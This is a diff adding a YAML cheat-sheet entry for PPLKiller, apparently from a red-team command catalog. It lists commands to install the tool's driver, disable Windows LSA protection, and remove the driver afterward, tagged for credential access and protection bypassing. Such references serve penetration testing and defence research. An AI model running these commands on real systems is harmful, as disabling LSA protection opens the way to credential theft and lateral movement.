@@ -1,0 +1,25 @@
+---
+projectLink: https://github.com/RedCursorSecurityConsulting/PPLKiller
+name: PPLKiller
+params:
+- name: Command
+  description: description
+
+sections:
+- name: Installing PPLKiller Driver
+  labels: ["Lateral", "Creds", "Protection Bypassing"]
+  commands:
+  - language: EXE
+    command: PPLKiller.exe /installDriver
+ 
+- name: Disabling PPL
+  labels: ["Lateral", "Creds", "Protection Bypassing"]
+  commands:
+  - language: EXE
+    command: PPLKiller.exe /disableLSAProtection
+   
+- name: Uninstalling PPLKiller Driver (cleanup)
+  labels: ["Lateral", "Creds", "Protection Bypassing"]
+  commands:
+  - language: EXE
+    command: PPLKiller.exe /uninstallDriver
